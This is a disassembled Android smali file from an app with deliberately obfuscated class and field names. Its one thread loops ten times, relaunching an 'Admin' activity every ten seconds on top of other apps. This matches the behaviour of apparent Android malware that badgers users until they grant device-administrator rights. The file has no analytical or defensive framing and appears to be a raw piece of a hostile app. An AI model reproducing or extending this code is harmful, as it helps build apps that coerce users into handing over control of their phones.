.class Lcompse/refact/st/upsssss/htyjyukuilulululu;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/MainActivity;


# direct methods
.method constructor <init>(Lcompse/refact/st/upsssss/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcompse/refact/st/upsssss/htyjyukuilulululu;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/MainActivity;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    const/4 v0, 0x0

    :goto_0
    const/16 v1, 0xa

    if-ge v0, v1, :cond_0

    :try_start_0
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/htyjyukuilulululu;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/MainActivity;

    const-class v3, Lcompse/refact/st/upsssss/Admin;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-wide/16 v2, 0x2710

    iget-object v4, p0, Lcompse/refact/st/upsssss/htyjyukuilulululu;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/MainActivity;

    add-int/lit8 v0, v0, 0x1

    invoke-virtual {v4, v1}, Lcompse/refact/st/upsssss/MainActivity;->startActivity(Landroid/content/Intent;)V

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :cond_0
    return-void
.end method
